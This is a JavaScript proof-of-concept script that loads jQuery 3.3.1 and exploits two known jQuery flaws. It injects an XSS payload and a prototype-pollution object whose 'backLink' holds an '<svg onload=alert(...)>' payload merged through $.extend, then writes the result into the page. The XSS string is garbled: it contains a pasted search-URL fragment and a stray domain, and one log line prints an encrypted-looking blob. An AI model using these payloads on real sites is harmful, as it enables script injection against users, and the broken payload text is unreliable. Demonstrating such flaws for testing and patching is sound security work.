const script = document.createElement('script');
script.src = "https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js";
document.head.appendChild(script);

// 2. Function to execute after jQuery is loaded
script.onload = function() {
    console.log("[+] Vulnerable jQuery loaded!");

    // 3. Inject malicious content for XSS (CVE-2020-7656)
    const maliciousContent = "<script>alert('cdaac3aee40885d219e33ff92077abfcfb4a443ceb825c09f28227portjai.netlify.appfdb7c942f2=?%253Cscript%253Ealert(%27XSS%2520via%25-7656%3A%2520%27%2520%2B%2520document.domain)%253C%2Fscript%2520%253E&oq=%253Cscript%253Ealert(%27XSS%2520via%25-7656%3A%2520%27%2520%2B%2520document.domain)%253C%2Fscript%2520%253E&gs_lcrp=EgZjaHJvbWUyBggAEEUYOdIBBzI3MWowajSoAgCwAgE&sourceid=chrome&ie=UTF-8 ' + document.domain)</script >"; // Space after </script>
    $('body').append(maliciousContent);
    console.log("[+]U2FsdGVkX1/Wc7yTEBwPSQQcsyihG4XXABZAEfN6ZMliCt1rvlrsTrpDzuiNb5bXd9qnmm4lfOITmCmxas0bcbKwNErpQsWyrSWW2dSXFu");

    // 4. Exploit Prototype Pollution (CVE-2019-11358)
    const defaultConfig = {
        "backLink": "<a href='https://portjai.netlify.app/'>Go Back</a>"
    };

    const maliciousParams = {
        "__proto__": {
            "backLink": "<svg onload=alert('XSS via CVE-2019-11358: Prototype Pollution!')>"
        }
    };

    // 5. Merge objects using vulnerable $.extend
    let config = $.extend(true, defaultConfig, maliciousParams);
    console.log("[+] Prototype Pollution executed via $.extend().");

    // 6. Create a container to inject malicious content
    const container = document.createElement('div');
    container.id = 'backLinkContainer';
    document.body.appendChild(container);

    // 7. Inject malicious content into the DOM
    $('#backLinkContainer').html(config.backLink);
    console.log("[+] XSS payload (CVE-2019-11358) injected into the DOM. Alert will be displayed.");
};

// 8. Instruction message
console.log("[*] Script injected. Waiting for jQuery to load...");
